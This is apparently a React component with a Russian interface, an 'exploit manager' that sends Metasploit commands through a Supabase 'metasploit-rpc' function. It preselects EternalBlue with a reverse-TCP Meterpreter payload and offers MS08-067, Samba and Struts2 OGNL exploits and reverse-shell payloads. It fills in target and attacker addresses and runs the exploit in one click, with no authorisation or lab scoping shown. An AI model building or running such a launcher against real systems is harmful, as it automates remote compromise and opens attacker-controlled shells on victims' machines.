
import { useState } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Textarea } from "@/components/ui/textarea"
import { Zap, Target, Play, Settings } from "lucide-react"
import { useToast } from "@/hooks/use-toast"
import { supabase } from '@/integrations/supabase/client'

interface ExploitConfig {
  target: string
  exploit: string
  payload: string
  options: Record<string, string>
}

export const ExploitManager = () => {
  const [config, setConfig] = useState<ExploitConfig>({
    target: '',
    exploit: 'exploit/windows/smb/ms17_010_eternalblue',
    payload: 'windows/x64/meterpreter/reverse_tcp',
    options: {
      RHOSTS: '',
      LHOST: '',
      LPORT: '4444'
    }
  })
  const [executing, setExecuting] = useState(false)
  const [results, setResults] = useState<string>('')
  const { toast } = useToast()

  const handleExecuteExploit = async () => {
    if (!config.target || !config.options.RHOSTS) {
      toast({
        title: "Ошибка",
        description: "Укажите цель (RHOSTS)",
        variant: "destructive",
      })
      return
    }

    setExecuting(true)
    setResults('')

    try {
      const commands = [
        `use ${config.exploit}`,
        `set PAYLOAD ${config.payload}`,
        `set RHOSTS ${config.options.RHOSTS}`,
        `set LHOST ${config.options.LHOST}`,
        `set LPORT ${config.options.LPORT}`,
        'exploit'
      ]

      for (const command of commands) {
        const { data, error } = await supabase.functions.invoke('metasploit-rpc', {
          body: { 
            action: 'execute',
            command
          }
        })

        if (error) throw error

        setResults(prev => prev + `msf6 > ${command}\n${data.output}\n\n`)
        
        // Небольшая задержка между командами
        await new Promise(resolve => setTimeout(resolve, 1000))
      }

      toast({
        title: "Эксплойт запущен",
        description: "Команды выполнены, проверьте результаты",
      })
    } catch (error: any) {
      toast({
        title: "Ошибка выполнения",
        description: error.message,
        variant: "destructive",
      })
      setResults(prev => prev + `Ошибка: ${error.message}\n`)
    } finally {
      setExecuting(false)
    }
  }

  return (
    <div className="space-y-6">
      <Card className="bg-gray-800/50 border-gray-700">
        <CardHeader>
          <CardTitle className="text-white flex items-center">
            <Zap className="h-5 w-5 mr-2 text-orange-400" />
            Менеджер эксплойтов
          </CardTitle>
          <CardDescription className="text-gray-400">
            Настройка и запуск эксплойтов
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label className="text-gray-300">Эксплойт</Label>
              <Select 
                value={config.exploit} 
                onValueChange={(value) => setConfig(prev => ({ ...prev, exploit: value }))}
              >
                <SelectTrigger className="bg-gray-900/50 border-gray-600 text-gray-300">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="exploit/windows/smb/ms17_010_eternalblue">MS17-010 EternalBlue</SelectItem>
                  <SelectItem value="exploit/windows/smb/ms08_067_netapi">MS08-067 NetAPI</SelectItem>
                  <SelectItem value="exploit/linux/samba/is_known_pipename">Samba Pipe</SelectItem>
                  <SelectItem value="exploit/multi/http/struts2_content_type_ognl">Struts2 OGNL</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label className="text-gray-300">Payload</Label>
              <Select 
                value={config.payload} 
                onValueChange={(value) => setConfig(prev => ({ ...prev, payload: value }))}
              >
                <SelectTrigger className="bg-gray-900/50 border-gray-600 text-gray-300">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</SelectItem>
                  <SelectItem value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter</SelectItem>
                  <SelectItem value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter</SelectItem>
                  <SelectItem value="generic/shell_reverse_tcp">Generic Shell</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className="grid grid-cols-3 gap-4">
            <div className="space-y-2">
              <Label className="text-gray-300">RHOSTS (Цели)</Label>
              <Input
                value={config.options.RHOSTS}
                onChange={(e) => setConfig(prev => ({ 
                  ...prev, 
                  options: { ...prev.options, RHOSTS: e.target.value }
                }))}
                className="bg-gray-900/50 border-gray-600 text-gray-300"
                placeholder="192.168.1.100"
              />
            </div>
            <div className="space-y-2">
              <Label className="text-gray-300">LHOST (Атакующий)</Label>
              <Input
                value={config.options.LHOST}
                onChange={(e) => setConfig(prev => ({ 
                  ...prev, 
                  options: { ...prev.options, LHOST: e.target.value }
                }))}
                className="bg-gray-900/50 border-gray-600 text-gray-300"
                placeholder="192.168.1.50"
              />
            </div>
            <div className="space-y-2">
              <Label className="text-gray-300">LPORT</Label>
              <Input
                value={config.options.LPORT}
                onChange={(e) => setConfig(prev => ({ 
                  ...prev, 
                  options: { ...prev.options, LPORT: e.target.value }
                }))}
                className="bg-gray-900/50 border-gray-600 text-gray-300"
                placeholder="4444"
              />
            </div>
          </div>

          <Button 
            onClick={handleExecuteExploit}
            disabled={executing}
            className="w-full bg-orange-600 hover:bg-orange-700"
          >
            {executing ? (
              <>
                <Settings className="h-4 w-4 mr-2 animate-spin" />
                Выполняется...
              </>
            ) : (
              <>
                <Play className="h-4 w-4 mr-2" />
                Запустить эксплойт
              </>
            )}
          </Button>
        </CardContent>
      </Card>

      {results && (
        <Card className="bg-gray-800/50 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center">
              <Target className="h-5 w-5 mr-2 text-green-400" />
              Результаты выполнения
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Textarea
              value={results}
              readOnly
              className="min-h-[300px] bg-black/50 border-gray-600 text-green-400 font-mono text-sm"
              placeholder="Результаты будут отображены здесь..."
            />
          </CardContent>
        </Card>
      )}
    </div>
  )
}
